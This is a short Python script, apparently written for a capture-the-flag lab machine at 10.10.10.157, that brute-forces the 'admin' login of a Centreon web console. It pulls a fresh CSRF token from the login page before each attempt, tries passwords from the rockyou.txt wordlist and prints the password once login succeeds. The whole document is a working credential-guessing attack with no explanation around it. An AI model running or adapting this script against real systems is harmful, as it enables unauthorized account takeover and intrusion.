#!/usr/bin/python

import requests
from bs4 import BeautifulSoup

url = "http://10.10.10.157"
filename = open("rockyou.txt","rb")

request = requests.session()
print("[+] Retrieving CSRF token to sumbit the login form")
page = request.get(url+"/centreon/index.php")
html_content = page.text
soup = BeautifulSoup(html_content, 'html.parser')
token = soup.findAll('input')[3].get("value")


for password in filename:
    password2 = password.strip()
    payload = {
            "useralias": "admin", 
            "password": password2, 
            "submitLogin": "Connect", 
            "centreon_token": token
            }
    page2 = request.post(url+"/centreon/index.php", payload)
    print token + ":" + password
    html_content2 = page2.text
    
    if "Your credentials are incorrect." in html_content2:
        soup = BeautifulSoup(html_content2, 'html.parser')
        token = soup.findAll('input')[3].get("value")
        print token
    else:
        print 'Password is: ' + password
        break
